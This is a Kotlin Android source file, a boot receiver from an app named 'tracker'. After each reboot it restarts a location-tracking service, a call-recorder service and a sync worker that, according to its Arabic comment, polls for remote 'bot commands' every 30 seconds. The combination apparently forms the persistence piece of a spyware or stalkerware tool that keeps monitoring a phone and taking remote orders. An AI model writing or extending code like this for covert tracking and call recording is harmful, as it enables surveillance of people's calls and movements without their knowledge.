package com.abuzahra.tracker.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.abuzahra.tracker.services.MainTrackerService
import com.abuzahra.tracker.services.CallRecorderService
import com.abuzahra.tracker.services.DataSyncWorker

/**
 * BootReceiver - مستقبل إشعار إعادة التشغيل
 * يعيد تشغيل جميع الخدمات عند إعادة تشغيل الجهاز
 * يضمن استمرار عمل التتبع ومزامنة البيانات
 */
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            // بدء خدمة التتبع الرئيسية
            val trackerIntent = Intent(context, MainTrackerService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(trackerIntent)
            } else {
                context.startService(trackerIntent)
            }

            // بدء خدمة تسجيل المكالمات
            val callIntent = Intent(context, CallRecorderService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(callIntent)
            } else {
                context.startService(callIntent)
            }

            // بدء مزامنة البيانات (التحقق من أوامر البوت كل 30 ثانية)
            DataSyncWorker.startImmediate(context)
        }
    }
}
